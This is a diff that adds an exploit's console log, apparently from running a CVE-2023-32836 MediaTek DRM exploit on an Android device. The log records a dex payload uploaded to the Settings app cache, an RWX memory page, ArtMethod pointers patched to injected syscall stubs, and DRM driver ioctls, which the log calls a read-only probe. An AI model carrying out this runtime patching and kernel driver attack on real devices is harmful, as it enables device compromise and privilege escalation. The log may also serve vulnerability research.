@@ -1,0 +1,37 @@
+[*] local md5 eadf34f4e349698a5446e02fc2b41446 size 30528
+    raw=29.8 KiB  b64=39.8 KiB  overhead=33%
+    [██████████████████████████████] 100%  39.8 KiB/39.8 KiB  662.0 KiB/s  done
+[+] Upload: 39.8 KiB in 0.1s (660.8 KiB/s, 1 chunks)
+[*] Decoding on device...
+[*] remote size 30528
+eadf34f4e349698a5446e02fc2b41446  /data/data/com.android.settings/cache/trigger.dex
+[*] CVE-2023-32836 DRM exploit (Java/dalvikvm)
+[*] pid=26548 uid=1000 mode=mtkprobe
+[*] === MTK private DRM getter probe (safe) ===
+
+[*] Fixed-size query ioctls only; no write/set/mutex paths are used.
+[+] Scratch buffer at 0x7ef433c000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7ef4337000
+[+] Wrote syscall stubs: JNI@+0x00 (36B), Quick@+0x40 (36B)
+[*] ArtMethod for nativeSyscall at 0x7c54724720
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7c5cc1a2c0
+    entry_point    = 0x1038000812c03c80
+[*] Patching data_ (JNI) -> 0x7ef4337000
+[*] Patching entry_point (quick) -> 0x7ef4337040
+    data_       = 0x7ef4337000 OK
+    entry_point = 0x7ef4337040 OK
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[*] openat /dev/dri/card0 ret=5
+[*] MTK_GET_DISPLAY_CAPS cmd=0xc0286448 len=40 ret=-13 (EACCES)
+[*] MTK_GET_SESSION_INFO cmd=0xc010644a len=16 ret=-13 (EACCES)
+[*] MTK_GET_MASTER_INFO cmd=0xc004644c len=4 ret=0
+    words: [0]=0x0
+[*] MTK_GET_LCM_INDEX cmd=0xc004646c len=4 ret=0
+    words: [0]=0x0
+[*] MTK_AAL_GET_SIZE cmd=0xc00c6475 len=12 ret=0
+    words: [0]=0x640 [1]=0xa00 [2]=0x1
+[*] Done
